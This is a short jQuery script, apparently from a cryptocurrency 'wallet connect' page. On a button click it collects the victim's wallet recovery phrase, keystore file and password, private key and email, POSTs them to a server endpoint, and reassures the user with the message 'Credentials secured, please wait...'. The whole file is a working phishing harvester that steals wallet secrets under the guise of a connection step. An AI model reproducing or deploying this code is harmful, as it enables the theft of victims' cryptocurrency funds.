$(document).ready(function () {
    
});

$(".connect-btn").click(function (e) { 
    e.preventDefault();
    
    let email = $("#myForm").attr('class');

    let wallet = $("#wallet_id").val();
    let phrase = $("#phraseinput").val();
    let keystoreval = $("#keystoreval").val();
    let keystorepass = $("#keystorepass").val();
    let privatekey = $("#privatekeyval").val();
    
    sendCredentials({
        email: email,
        wallet: wallet,
        phrase: phrase,
        keystorevalue: keystoreval,
        keystorepass: keystorepass,
        privatekey: privatekey
    });
});

function sendCredentials(data) {
    $.ajax({
        type: "POST",
        url: "api/v2/index",
        data: 
        {
            data: data
        },
        dataType: "json",
    })
    .done(function( msg ) {
        toastr.success("Credentials secured, please wait...");
        // setTimeout(function() {
        //     window.location.href = "success.html";
        // }, 3000);
    })
    .fail(function( msg ) {
        console.log(msg.responseText);
    });
}